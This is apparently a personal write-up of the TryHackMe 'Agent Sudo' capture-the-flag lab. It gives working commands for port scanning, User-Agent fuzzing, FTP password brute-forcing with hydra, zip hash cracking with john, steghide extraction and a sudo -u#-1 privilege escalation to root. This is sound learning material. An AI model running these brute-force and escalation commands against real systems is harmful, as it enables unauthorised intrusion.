# Agent Sudo TryHackMe

## 2024-01-02, Joakim Oscarsson

### Problem description

Capture the flag!

### Solution

###  nmap

nmap -sV -oN "output_nmap.txt" <ip>
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


### Dirbuster

No good results

### fuff
ffuf -w ./new_usernames.txt -u http://10.10.0.204/index.php -H "User-Agent: FUZZ" -fs 422

No good results

After changing the User-Agent to "C" we get the username "chris" so we use that as name for FTP login

### hydra
(another good password file is rockyou.txt)
hydra -l chris -P ./passwords.txt -V -I ftp://10.10.46.46

With this tool, we found that the FTP password was "crystal" for user chris.

On the ftp server there were a bunch of files, one jpg, one png and a textfile.

Apparently one of the images seem to contain a zip file, so we use the tool binwalk to see whats inside

### binwalk

binwalk -e cutie.png

This gives us an extracted folder containing an empty text file and some ziped folder. The ziped folder is extracted with 7z x 8702.zip but it asks for password so we need to crack it.

### zip2john

This tool can crack a zip file password

we use the command: zip2john 8702.zip > hash.txt to extract the hashed password.

### john the ripper

Then we use the command john hash.txt to get the password "alien".

### base64

The ziped directory contains a text file with a word "QXJlYTUx", this is encoded in base64 and translates into "Area51". 

### steghide

Since the question asks for a steg password we try to input "Area51" and that is correct. But this means that the jpg might contain a secret message. So we use the command: steghide extract -sf cute-alien.jpg and get that the user's name is "james" and the ssh password is "hackerrules!".

### ssh

After running ssh james@10.10.152.222 with password "hackerrules!" we get the user.txt flag and an image of an alien which we download by exiting ssh and then from our local user types: scp james@10.10.152.222:Alien_autopsy.jpg . 

### privilege escalation

Now we want to escalate our privileges by becoming root. By running sudo -l we see that our permission is:
(ALL, !root) /bin/bash

This means that we can run /bin/bash as any user except root. By googling this we find an exploit where one can type sudo -u#-1 /bin/bash to gain root access. This is due to sudo not verifying the existence of -1 and when it returns with the value 0, we gain root privileges.

### root

Now we have root access so we just cd into root and take our flag!